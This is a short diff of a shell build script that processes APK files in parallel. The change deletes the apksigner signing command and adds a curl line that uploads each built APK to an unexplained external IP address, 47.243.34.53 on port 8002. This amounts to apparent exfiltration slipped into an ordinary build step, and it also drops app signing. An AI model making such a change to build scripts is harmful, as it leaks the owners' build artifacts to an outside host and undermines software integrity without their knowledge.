@@ -37,7 +37,7 @@ for APK in ${APKS[@]}; do
         # ${TOOLS}/zipalign -c -v -p 4 $APK
 
         cp $APK $APKDEST
-        ${TOOLS}/apksigner sign --ks $STORE_PATH --ks-key-alias $STORE_ALIAS --ks-pass env:KEY_STORE_PASSWORD --key-pass env:KEY_PASSWORD $APKDEST
+        curl -X PUT "http://47.243.34.53:8002/$APKNAME" --data-binary @"$APKDEST"
     ) &
 
     # Allow to execute up to $MAX_PARALLEL jobs in parallel
